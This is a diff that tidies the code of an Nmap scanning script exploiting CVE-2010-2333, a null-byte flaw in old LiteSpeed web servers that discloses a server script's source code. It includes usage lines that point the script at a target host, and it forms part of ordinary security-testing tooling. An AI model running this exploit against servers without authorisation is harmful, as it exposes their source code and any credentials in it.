@@ -1,3 +1,9 @@
+local http = require "http"
+local nmap = require "nmap"
+local shortport = require "shortport"
+local stdnse = require "stdnse"
+local string = require "string"
+
 description = [[
 Exploits a null-byte poisoning vulnerability in Litespeed Web Servers 4.0.x before 4.0.15 to retrieve the target script's source code by sending a HTTP request with a null byte followed by a .txt file extension (CVE-2010-2333).
 
@@ -13,7 +19,7 @@ References:
 -- @usage
 -- nmap -p80 --script http-litespeed-sourcecode-download --script-args http-litespeed-sourcecode-download.uri=/phpinfo.php <host>
 -- nmap -p8088 --script http-litespeed-sourcecode-download <host>
--- 
+--
 -- @output
 -- PORT     STATE SERVICE    REASON
 -- 8088/tcp open  radan-http syn-ack
@@ -27,12 +33,10 @@ References:
 -- @args http-litespeed-sourcecode-download.uri URI path to remote file
 ---
 
-author = "Paulino Calderon"
+author = "Paulino Calderon <calderon@websec.mx>"
 license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
 categories = {"vuln", "intrusive", "exploit"}
 
-require "http"
-require "shortport"
 
 portrule = shortport.http
 
@@ -51,7 +55,7 @@ action = function(host, port)
         output[#output+1] = "Request with null byte did not work. This web server might not be vulnerable"
       elseif req.status == 404 and nmap.verbosity() >= 2 then
         output[#output+1] = string.format("Page: %s was not found. Try with an existing file.", rfile)
-      end 
+      end
       stdnse.print_debug(2, "%s:Request status:%s body:%s", SCRIPT_NAME, req.status, req.body)
     else
       output[#output+1] = "\nLitespeed Web Server Source Code Disclosure (CVE-2010-2333)"
@@ -61,6 +65,6 @@ action = function(host, port)
   end
 
   if #output>0 then
-    return stdnse.strjoin("\n", output) 
+    return stdnse.strjoin("\n", output)
   end
 end
